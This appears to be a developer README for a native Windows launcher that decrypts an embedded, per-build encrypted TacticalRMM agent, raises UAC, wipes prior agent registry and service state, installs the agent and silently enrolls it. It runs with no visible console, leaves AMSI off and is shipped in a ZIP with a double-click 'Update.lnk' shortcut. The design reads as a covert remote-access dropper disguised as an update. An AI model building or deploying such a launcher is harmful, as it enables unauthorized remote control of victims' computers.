# Native launcher (Option 3) — automatic enrollment, no Mono runtime

Replaces the Mono-IL `Launcher.exe` with a **bare native Windows PE** so the
ZIP bundle actually enrolls a device end-to-end on a stock Windows host:

- **runs on stock Windows** — no Mono/.NET runtime, no file-association hack
  (fixes the earlier "device not added" runtime gap).
- **installs to Program Files, then auto-enrolls** — the launcher does not stop
  at staging: it scrubs stale TacticalRMM/Mesh registry + service state, installs
  the decrypted agent to `C:\Program Files\TacticalAgent\tacticalrmm.exe`, waits
  ~6s for it to settle, then runs the **installed binary** with the full `enroll`
  argv (`-m install --api … --client-id … --site-id … --agent-type … --auth …`)
  via `CreateProcess` — zero manual steps. Installing to Program Files first is
  what makes the `tacticalrmm -m svc` service start (its ImagePath points there;
  running the transport from a Temp-staged `_stg_*.exe` left the service Stopped).
- **no console, no PowerShell, no script host, no shell invocation** — compiled
  with `-mwindows` (PE Subsystem 2 / GUI); `enroll` is parsed (never run
  through a shell) and handed to `CreateProcess`. AMSI default stays `none`.

The `VNTR` overlay wire format is **unchanged** (LOCKED in
`docs/launcher-integration-spec.md`); this is a byte-compatible re-implementation of
the decryption in C, so pooled server stamps keep working.

## Files

| file | purpose |
|---|---|
| `launcher.c`   | entry point: self-locate → decrypt → scrub stale TacticalRMM/Mesh registry + service state → install to `C:\Program Files\TacticalAgent\tacticalrmm.exe` → settle-wait → run the installed exe with the `enroll` argv (or `SELFTEST`). Windows-only helpers: recursive registry scrub, uninstall-key cleanup, service delete, recursive mkdir |
| `overlay.c`    | LOCKED VNTR overlay reader + AES-256-CTR envelope/config/payload decrypt |
| `aes256.c/.h`  | AES-256 (encrypt block) + CTR with big-endian 128-bit counter (byte-identical to template.cs/OpenSSL) |
| `config.c`     | percent-decoded config parser; quote-aware tokenizer for the `enroll` line |
| `spawn.c`      | `CreateProcess` (Windows, no window) / fork-exec (POSIX) |
| `seal.h`       | compile-time seal — `KEY`/`IV`/`TAG` baked per build (mirror of `SealData.cs`) |
| `launcher.rc` + `launcher.manifest` | RT_MANIFEST with `requestedExecutionLevel=requireAdministrator` — compiled via `windres` and linked in so a double-click raises UAC once (staging + service install run elevated). AMSI stays `none`. |
| `build-native.sh` | MinGW cross-compile to a GUI-subsystem PE + asserts Subsystem=2, embedded `requireAdministrator` manifest, prints SHA-256; exits non-zero on failure |

## Build (cross-compile a Windows PE)

```bash
# on a host with x86_64-w64-mingw32-gcc (e.g. Ubuntu: apt-get install gcc-mingw-w64-x86-64)
cd generator/launcher/native
KEY=$(od -An -N32 -tx1 /dev/urandom | tr -d ' \n')
IV=$(od  -An -N16 -tx1 /dev/urandom | tr -d ' \n')
TAG=$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')
bash build-native.sh /tmp/Launcher.exe "$KEY" "$IV" "$TAG"
# -> PE32+ (GUI) + sha256 (verify: file /tmp/Launcher.exe shows "GUI")
# (links -ladvapi32 for the registry/service APIs the install cleanup needs)
```

The generator's launcher pool does this automatically when
`LAUNCHER_NATIVE=1` (see `generator/src/env.ts` → `env.LAUNCHER_NATIVE` and
`launcher-pool.ts → buildOne()`). `NATIVE_CC` overrides the compiler name.

## Host selftest (validate crypto + parser without Windows)

```bash
cc -O2 -DSELFTEST -o /tmp/lztest launcher.c overlay.c config.c spawn.c aes256.c
# stamp a dev overlay with make-stamp.mjs using the SAME seal as seal.h, then:
/tmp/lztest <stamped.exe> <outPayload.bin>     # -> SELFTEST-OK + CONFIG + ENROLL-TOKENS
cmp <outPayload.bin> <sourcePayload.bin>       # -> byte-identical (crypto proof)
```

## Verified 2026-09-13

- `cc` (macOS) compiles both `SELFTEST` and production branches clean.
- Host round-trip: C decrypted a `make-stamp.mjs` overlay to a **byte-identical**
  payload (`C-PAYLOAD-MATCH`, SHA-256 equal) — envelope/config/payload AES-256-CTR
  matches template.cs + Node.
- `enroll` PS-style line parsed to the correct `[exe] + argv`
  (`C:\Program Files\TacticalAgent\tacticalrmm.exe -m install …`) for `CreateProcess`.
- VPS cross-compile (`x86_64-w64-mingw32-gcc`): `file → PE32+ executable (GUI)`,
  byte-level Subsystem=2, `CreateProcessA`/`-m install`/marker strings present.
- `generator/src/launcher-pool.ts peSubsystem()` fixed to read Subsystem at +68 for
  both PE32 and PE32+ (the old +72 for 0x20b read `DllCharacteristics` and would
  have discarded a 64-bit native launcher).

## Verified 2026-09-14 (Program-Files install + relative .lnk + idempotent first install)

- Native launcher now installs the decrypted agent to
  `C:\Program Files\TacticalAgent\tacticalrmm.exe` and runs the `enroll` argv from
  there, so the `tacticalrmm -m svc` service (ImagePath points to that file) starts.
- Before installing it scrubs stale state (elevated): `HKLM\SOFTWARE\TacticalRMM`
  (+ `WOW6432Node`), the TacticalAgent/"Mesh Agent" Uninstall keys, and best-effort
  `tacticalrmm` / "Mesh Agent" services — so a re-deploy is a clean first install.
- Native `.lnk` bytes: `Update.lnk` now carries a minimal relative LinkInfo block
  + `HasLinkInfo` (flags `0xCE` = HasLinkInfo|HasName|HasRelativePath|HasIconLocation|
  IsUnicode, 279 B) so Explorer resolves `Launcher.exe` on a plain double-click
  (the old 250-B `0xCC` relative .lnk with no LinkInfo silently did nothing).
- Cross-compile warning-clean with `-ladvapi32`; SELFTEST + POSIX production compile
  clean on macOS (pre-existing `write_marker` unused warning in SELFTEST only).

## Known remaining step (unavoidable off this host)

A Windows-VM / wine run to observe the live double-click → UAC → install →
`tacticalrmm` + `Mesh Agent` services **Running** → device Online. No wine is
present on the build VPS; the runbook step (3-E) covers it.